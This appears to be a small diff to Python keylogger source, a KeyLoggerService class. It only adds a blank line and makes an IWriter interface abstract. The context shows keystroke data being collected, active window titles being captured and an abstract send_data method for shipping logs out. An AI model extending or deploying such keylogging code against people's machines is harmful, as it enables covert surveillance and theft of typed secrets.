@@ -33,6 +33,7 @@ class KeyLoggerService(IKeyLogger):
         self.data.clear()
         return data
 
+
     def start_logging(self) -> None:
         self.running = True
 
@@ -64,7 +65,7 @@ class KeyLoggerService(IKeyLogger):
         window = gw.getActiveWindow()
         return window.title if window else "Unknown Window"
 
-class IWriter:
+class IWriter(ABC):
     @abstractmethod
     def send_data(self, data):
         pass
